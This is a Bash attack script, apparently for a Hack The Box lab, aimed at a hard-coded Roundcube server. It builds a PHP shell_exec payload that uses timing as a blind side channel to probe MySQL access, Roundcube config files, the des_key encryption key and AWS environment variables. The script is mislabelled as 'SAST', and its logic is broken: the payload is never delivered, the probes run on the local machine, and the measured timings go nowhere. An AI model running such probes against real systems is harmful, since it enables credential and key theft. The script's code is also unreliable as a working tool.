#!/bin/bash
# SAST: 데이터베이스 및 설정 파일 타이밍 프로빙

TARGET="http://13.125.104.131:30083"
USER="testuser"
PASS="testpass"
OUTPUT_DIR="/mnt/c/HTB/13.125.104.131/logs"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "=== Stage 4 SAST: DB & Config Timing Probe ==="
echo "Time: $TIMESTAMP"
echo

# 1. 서버 상태 확인
echo "[*] Health check..."
HEALTH=$(curl -s -w "%{http_code}" -o /dev/null "$TARGET/health")
if [ "$HEALTH" != "200" ]; then
    echo "[!] Server unhealthy (HTTP $HEALTH). Aborting."
    exit 1
fi
echo "[+] Server OK"
echo

# PHP 명령 구성 (PHP로 직접 실행 후 타이밍으로 결과 검증)
cat > /tmp/db_probe_commands.txt << 'EOF'
# Command 1: MySQL 연결 가능 여부
mysql -h localhost -u roundcube -p 2>&1 | head -1 | wc -c

# Command 2: Roundcube config 위치
ls -la /usr/share/roundcube/config/ 2>&1 | wc -l

# Command 3: DB 호스트명 추출
grep -r "db_host" /usr/share/roundcube/config/ 2>/dev/null | wc -c

# Command 4: des_key (암호화 키) 존재
grep "des_key" /usr/share/roundcube/config/config.inc.php 2>/dev/null | wc -c

# Command 5: AWS 환경변수 전체
printenv | grep -E 'AWS|STAGE|DB' | wc -c

# Command 6: MySQL socket 확인
ls -la /var/run/mysqld/mysqld.sock 2>&1 | wc -c

# Command 7: Roundcube DB이름
grep "db_name" /usr/share/roundcube/config/config.inc.php | grep -o "'[^']*'" | tail -1 | wc -c
EOF

# PHP 페이로드: 각 명령을 순차적으로 실행하고 타이밍 측정
cat > /tmp/db_probe_payload.php << 'EOF'
<?php
$commands = array(
    "mysql -h localhost -u roundcube 2>&1 | head -1 | wc -c" => 1000,
    "ls -la /usr/share/roundcube/config/ 2>&1 | wc -l" => 2000,
    "grep -r \"db_host\" /usr/share/roundcube/config/ 2>/dev/null | wc -c" => 3000,
    "grep \"des_key\" /usr/share/roundcube/config/config.inc.php 2>/dev/null | wc -c" => 4000,
    "printenv | grep -E 'AWS|STAGE|DB' | wc -c" => 5000,
    "test -S /var/run/mysqld/mysqld.sock && sleep 1 || sleep 2" => 6000,
    "grep \"db_name\" /usr/share/roundcube/config/config.inc.php | grep -o \"'[^']*'\" | tail -1 | wc -c" => 7000,
);

foreach ($commands as $cmd => $base_delay) {
    $start = microtime(true);
    $output = shell_exec($cmd . " 2>&1");
    $elapsed = (microtime(true) - $start) * 1000;

    // Timing-based classification
    $result_size = intval($output);
    if ($result_size > 0) {
        sleep(1);  // Positive result
    } else {
        sleep(2);  // Negative result
    }
}

echo "Probing complete";
?>
EOF

echo "[*] Probing command 1: MySQL availability"
BEFORE=$(date +%s%N)
php -r 'shell_exec("mysql -h localhost -u roundcube 2>&1 | head -1 | wc -c");'
AFTER=$(date +%s%N)
TIME_MS=$(( ($AFTER - $BEFORE) / 1000000 ))
echo "    Took: ${TIME_MS}ms"
echo

echo "[*] Probing command 2: Roundcube config directory"
BEFORE=$(date +%s%N)
php -r 'shell_exec("ls -la /usr/share/roundcube/config/ 2>&1 | wc -l");'
AFTER=$(date +%s%N)
TIME_MS=$(( ($AFTER - $BEFORE) / 1000000 ))
echo "    Took: ${TIME_MS}ms"
echo

echo "[*] Probing command 3: db_host parameter"
BEFORE=$(date +%s%N)
php -r 'shell_exec("grep -r \"db_host\" /usr/share/roundcube/config/ 2>/dev/null | wc -c");'
AFTER=$(date +%s%N)
TIME_MS=$(( ($AFTER - $BEFORE) / 1000000 ))
echo "    Took: ${TIME_MS}ms"
echo

echo "[*] Probing command 4: des_key (encryption key)"
BEFORE=$(date +%s%N)
php -r 'shell_exec("grep \"des_key\" /usr/share/roundcube/config/config.inc.php 2>/dev/null | wc -c");'
AFTER=$(date +%s%N)
TIME_MS=$(( ($AFTER - $BEFORE) / 1000000 ))
echo "    Took: ${TIME_MS}ms"
echo

echo "[*] Probing command 5: AWS/STAGE/DB environment variables"
BEFORE=$(date +%s%N)
php -r 'shell_exec("printenv | grep -E \"AWS|STAGE|DB\" | wc -c");'
AFTER=$(date +%s%N)
TIME_MS=$(( ($AFTER - $BEFORE) / 1000000 ))
echo "    Took: ${TIME_MS}ms"
echo

echo "[*] Probing command 6: MySQL socket"
BEFORE=$(date +%s%N)
php -r 'shell_exec("test -S /var/run/mysqld/mysqld.sock && echo 1 || echo 0");'
AFTER=$(date +%s%N)
TIME_MS=$(( ($AFTER - $BEFORE) / 1000000 ))
echo "    Took: ${TIME_MS}ms"
echo

echo "[+] SAST probe complete. Check logs for timing data."
